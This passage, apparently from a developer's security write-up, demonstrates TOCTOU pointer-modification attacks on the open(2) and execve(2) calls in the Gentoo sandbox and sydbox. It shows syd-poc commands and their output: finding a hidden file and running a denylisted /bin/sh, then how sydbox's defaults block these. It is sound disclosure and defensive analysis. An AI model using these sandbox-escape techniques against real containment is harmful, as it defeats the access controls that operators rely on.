[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = 3
[!] TOCTOU attack succeeded after 28 attempts!
[!] Target path /tmp/ctf/FLAG is known to exist!
[*] Passing file descriptor 3 to the command...
[*] Executing command with target FD Some(OwnedFd { fd: 3 })...
open("/etc/ld-x86_64-pc-linux-musl.path", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/usr/x86_64-pc-linux-musl/lib/libcap.so.2", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/etc/passwd", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/etc/group", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/usr/share/zoneinfo/Europe/Berlin", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_CLOEXEC) = 4
l--------- 1 alip alip 64 May 18 16:46 /proc/self/fd/3 -> /tmp/ctf/FLAG
$
```

### Case 2: Defaults

- We set a timeout for convenience.

```
$ syd \
    -m "allow/read,stat,exec+/{etc,dev,proc,usr,var,lib*}/***" \
    -m "allow/write+/dev/{null,tty,pts/*}" \
    syd-poc path -t60 /tmp/ctf/FLAG ls -l /proc/self/fd/3
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eopen" "--" "sh" "-xc" "cat /dev/null > /dev/null"
[?] strace is not available, continuing without.
[*] Starting open(2) O_PATH pointer modification TOCTOU attack...
[*] Benign file: /proc/self/root/dev/null
[*] Target file: /tmp/ctf/FLAG
[*] Attack timeout is 60 seconds.
[*] Still trying... 16291 attempts so far.
[*] Still trying... 32506 attempts so far.
[*] Still trying... 48219 attempts so far.
[*] Still trying... 64028 attempts so far.
[*] Still trying... 79960 attempts so far.
[?] Timeout reached after 96196 attempts.
[?] Try increasing timeout with "-t timeout".
$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 2: Takeaways

- FLAG is a bit closer to us now that **we can detect the existence of
  files that are *hidden* by the sandbox.** We've successfully attained
  a file descriptor to the file, however we can't use this file
  descriptor to read the file as it lacks read rights (`O_PATH` vs.
  `O_RDONLY`). At this point though, it should be clear to the reader
  how to perform a simple
  [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
  attack so the same method can be applied similarly to stat, read,
  write and execute a denylisted file. The first three of these, *stat,
  read and write*, can be effectively made
  [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)-free
  thanks to the `SECCOMP_ADDFD` [_seccomp_(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html) request and the
  [_openat2_(2)](https://man7.org/linux/man-pages/man2/openat2.2.html) system call. We'll talk about exec in the next
  experiment.
- [sydbox](https://lib.rs/crates/syd) isn't affected by default, quoting
  [BUGS](http://man.exherbolinux.org/syd.7.html#BUGS) section of the
  [_syd_(7)](http://man.exherbolinux.org/syd.7.html) manual page:
  - As of version 3.19.0, [sydbox](https://lib.rs/crates/syd) turns the
    `O_PATH` flag in
    [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html)
    system call arguments to the `O_RDONLY` flag and emulates the system
    call as usual which avoids the
    [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
    vector. This may have unintended side effects (e.g.
    [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html) with
    `O_PATH` will not update access time but
    [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html) with
    `O_RDONLY` will) so the option
    [`trace/allow_unsafe_open:1`](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_open)
    is provided to avoid the flag change and continue the
    [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html) call
    in the sandbox process.
- [sydbox](https://lib.rs/crates/syd) with
  [`trace/allow_unsafe_open:1`](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_open)
  is vulnerable due to the same reason as the
  [Gentoo](https://www.gentoo.org/) sandbox. Let's repeat the old but
  golden rule: **Resuming the system call in the sandbox process after
  access check is unsafe!**
- [The kernel](https://kernel.org/) _should_ provide a safe
  [API](https://en.wikipedia.org/wiki/API) for this for seccomp, [see
  #218501.](https://bugzilla.kernel.org/show_bug.cgi?id=218501)
  - Pass `O_PATH` along with the `O_CLOEXEC` flag in new file descriptor
    flags of `SECCOMP_ADDFD`?

# [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 3: [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) pointer modification

## Setup

No setup is necessary for this
[PoC](https://en.wikipedia.org/wiki/Proof_of_concept). We are going to
denylist an executable, namely `/bin/sh`, and then try to execute it
regardless of the denylist.  The benign executable is created as a
temporary file by
[_syd-poc_(1)](http://man.exherbolinux.org/syd-poc.1.html), therefore
the directory `/tmp` is expected to be allowlisted by the sandbox.

```
$ readlink -f /bin/sh
/usr/x86_64-pc-linux-musl/bin/bash
$ syd-poc exec -h
Usage syd-poc exec [-hsS] [-t timeout] {[executable] [args...]}
Execute a denylisted file utilising pointer TOCTOU.
Method of attack is pointer modification on the execve(2) system call making use of TOCTOU.
Expects the directory /tmp is allowlisted for exec.
Target executable defaults to /bin/sh.
Default is to try until interrupted, specify a timeout with "-t timeout".
Use -s to run test under strace, -S to skip strace auto-detection and run without tracing.
```

## syd-poc exec

- [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
  on [_execve_(2)](https://man7.org/linux/man-pages/man2/execve.2.html) with pointer modification by a fellow malicious thread.
- The method is identical to
  [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1 and 2, except
  we use the
  [_execve_(2)](https://man7.org/linux/man-pages/man2/execve.2.html)
  system call.
- Goal: Execute a file despite the sandbox denylisting it.

```
syd-poc exec
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eexecve" "--" "/bin/true"
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-qq" "-eexecve" "--" "/usr/local/bin/syd-poc" "exec"
execve("/usr/local/bin/syd-poc", ["/usr/local/bin/syd-poc", "exec"], 0x7ffcdc980ba8 /* 110 vars */) = 0
[*] Starting execve(2) pointer modification TOCTOU attack...
[*] Benign executable: /tmp/syd_poc_b6c6eba552ae5564b6c6eba552ae5564
[*] Target executable: /bin/sh
[*] Attack will continue until interrupted (Press ^C to stop).
execve("/tmp/syd_poc_b6c6eba552ae5564b6c6eba552ae5564", ["/bin/sh", "-"], NULL) = -1 EACCES (Permission denied)
[pid 2924326] execve("/bin/sh", ["/bin/sh", "-"], NULL) = 0
sh-5.2$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 3: [Gentoo sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage))

Not applicable, because [Gentoo](https://www.gentoo.org/) sandbox doesn't do [Exec
Sandboxing](http://man.exherbolinux.org/syd.7.html#Exec_Sandboxing).

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 3: [Exherbo sydbox](https://lib.rs/crates/syd)

- We use the same [sydbox](https://lib.rs/crates/syd) rules as we used for
  [PoCs](https://en.wikipedia.org/wiki/Proof_of_concept) 1 & 2, with the
  addition of two rules: one to deny exec access to `/bin/sh` using its
  canonical path, and second to allowlist the directory `/tmp`
  recursively.

### Case 1: [allow\_unsafe\_exec](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_exec)

- [`trace/allow_unsafe_exec:1`](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_exec)
  option is provided to remove the
  [_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
  dependency from the sandbox.
- Quoting
  [_syd_(2)](http://man.exherbolinux.org/syd.2.html)
  manual page:
  - *Warning*, this option makes [sydbox](https://lib.rs/crates/syd)
    keep the `CAP_SYS_PTRACE` capability and disables [Force
    Sandboxing](http://man.exherbolinux.org/syd.7.html#Force_Sandboxing),
    [SegvGuard](http://man.exherbolinux.org/syd.7.html#SegvGuard) and
    [the exec-TOCTOU
    mitigator](http://man.exherbolinux.org/syd.7.html#TOCTOU_due_to_pointer_modification).
    It allows the sandbox process to trivially break out of the sandbox
    by e.g. attaching to the [sydbox](https://lib.rs/crates/syd) main
    thread with
    [_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
    and getting a handle to the
    [_seccomp_(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html)
    notify file descriptor. Therefore, **this option should only be used
    in trusted environments.**

```
$ syd \
    -m "allow/read,stat,exec+/{etc,dev,proc,usr,var,lib*}/***" \
    -m "allow/write+/dev/{null,tty,pts/*}" \
    -m "deny/exec+/usr/x86_64-pc-linux-musl/bin/bash" \
    -m "allow/read,stat,write,exec+/tmp/***" \
    -m trace/allow_unsafe_exec:1 \
    syd-poc exec
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eexecve" "--" "/bin/true"
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-qq" "-eexecve" "--" "/usr/local/bin/syd-poc" "exec"
execve("/usr/local/bin/syd-poc", ["/usr/local/bin/syd-poc", "exec"], 0x7ffceeee0ba8 /* 109 vars */) = 0
[*] Starting execve(2) pointer modification TOCTOU attack...
[*] Benign executable: /tmp/syd_poc_1bfff32e5162fbc71bfff32e5162fbc7
[*] Target executable: /bin/sh
[*] Attack will continue until interrupted (Press ^C to stop).
[pid 3067418] execve("/bin/sh", ["/bin/sh", "-"], NULL{"act":"Deny","c":9525657828114757,"cap":"x","cmd":"/usr/local/bin/syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"cranky_johnson","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":3067418,"sys":"execve","t":1716061643,"uid":1000}
) = -1 EACCES (Permission denied)
[pid 3067418] execve("/bin/sh", ["/bin/sh", "-"], NULL{"act":"Deny","c":9525657831092475,"cap":"x","cmd":"/usr/local/bin/syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"cranky_johnson","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":3067418,"sys":"execve","t":1716061643,"uid":1000}
) = -1 EACCES (Permission denied)
[pid 3067418] execve("/bin/sh", ["/bin/sh", "-"], NULL{"act":"Deny","c":9525657836921769,"cap":"x","cmd":"/usr/local/bin/syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"cranky_johnson","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":3067418,"sys":"execve","t":1716061643,"uid":1000}
) = -1 EACCES (Permission denied)
execve("/tmp/syd_poc_1bfff32e5162fbc71bfff32e5162fbc7", ["/bin/sh", "-"], NULL) = 0
sh-5.2$
```

### Case 2: Defaults

- [sydbox](https://lib.rs/crates/syd) does best-effort Exec Sandboxing
  to `Deny` on syscall entry.
- Since
  [_execve_(2)](https://man7.org/linux/man-pages/man2/execve.2.html)
  can't be emulated [sydbox](https://lib.rs/crates/syd) has to **resume
  the call in the sandbox process**. This opens a
  [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
  vector which is effectively mitigated.
- Quoting [BUGS](http://man.exherbolinux.org/syd.7.html#BUGS) section of the
  [_syd_(7)](http://man.exherbolinux.org/syd.7.html) manual page:
  - As of version 3.16.0, [sydbox](https://lib.rs/crates/syd) applies an
    effective
    [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
    mitigation for
    [_execve_(2)](https://man7.org/linux/man-pages/man2/execve.2.html),
    and _execveat_(2) system calls utilizing `PTRACE_EVENT_EXEC`. To
    mitigate, [sydbox](https://lib.rs/crates/syd) stops the process
    before return from
    [_execve_(2)](https://man7.org/linux/man-pages/man2/execve.2.html)
    using
    [_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
    and checks the updated `/proc/pid/exe` magic symbolic link of the
    process against the sandbox. If the path is found to be denylisted,
    which indicates a successful
    [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
    attempt to execute a denylisted path,
    [sydbox](https://lib.rs/crates/syd) terminates the process.

```
$ syd \
    -m "allow/read,stat,exec+/{etc,dev,proc,usr,var,lib*}/***" \
    -m "allow/write+/dev/{null,tty,pts/*}" \
    -m "deny/exec+/usr/x86_64-pc-linux-musl/bin/bash" \
    -m "allow/read,stat,write,exec+/tmp/***" \
    syd-poc exec
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eexecve" "--" "/bin/true"
[?] strace is not available, continuing without.
[*] Starting execve(2) pointer modification TOCTOU attack...
[*] Benign executable: /tmp/syd_poc_8f0cbe3c77d06e918f0cbe3c77d06e91
[*] Target executable: /bin/sh
[*] Attack will continue until interrupted (Press ^C to stop).
{"act":"Deny","c":9520916054313989,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916056498563,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916061241357,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916067524642,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916069832642,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916074762557,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916077102451,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Deny","c":9520916079252142,"cap":"x","cmd":"syd-poc exec ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"execve","t":1716059742,"uid":1000}
{"act":"Kill","bins":["/usr/x86_64-pc-linux-musl/bin/bash"],"c":9520916087499389,"cap":"x","cmd":"/bin/sh - ","ctx":"access","cwd":"/home/alip/src/syd/syd-3","id":"brave_cerf","l":2,"path":"/usr/x86_64-pc-linux-musl/bin/bash","pid":2932143,"sys":"exec","t":1716059742,"uid":1000}
$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 3: Takeaways

- Mitigation
  - Terminating the process at `PTRACE_EVENT_EXEC` is safe, but:
    1. It is intrusive.
    1. It pulls in the
       [_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
       dependency into a _seccomp_(2) sandbox.
- Solution
  - [The kernel](https://kernel.org/) _should_ provide a safe
    [API](https://en.wikipedia.org/wiki/API) for this for seccomp, [see
    #218501.](https://bugzilla.kernel.org/show_bug.cgi?id=218501)
    - `SECCOMP_EXEC` akin to `SECCOMP_ADDFD`?

# Conclusion

Both [Gentoo's sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage))
and [Exherbo's sydbox](https://lib.rs/crates/syd) aim to provide
user-space sandboxing on [Linux](https://en.wikipedia.org/wiki/Linux),
but they differ significantly in their approach and effectiveness.
[Gentoo](https://www.gentoo.org/)'s sandbox is primarily designed to
detect package build mishaps and offers limited defense against
sophisticated attacks. On the other hand,
[sydbox](https://lib.rs/crates/syd), with sydbox-3, attempts to function
as a security boundary with more advanced features and mitigations
against [TOCTOU (Time-of-Check to
Time-of-Use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
attacks. Despite these efforts, both sandboxes are still vulnerable to
certain
[TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
exploits due to inherent limitations in the
[_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) and
[_seccomp_(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html)
frameworks, which requires some system calls to be resumed within the
sandbox process. To enhance the security of these sandboxing tools,
there is a pressing need for the [Linux kernel](https://kernel.org/) to
provide safer [APIs](https://en.wikipedia.org/wiki/API) for handling
critical system calls with the
[_seccomp_(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html)
framework. Additionally, best practices such as using the "write xor
execute" (W^X) approach, mount namespaces, and
[Landlock](https://landlock.io/) should be
employed to create a more secure sandboxing environment.

<!-- vim: set et tw=72 : -->

--/04w6evG8XlLl3ft--

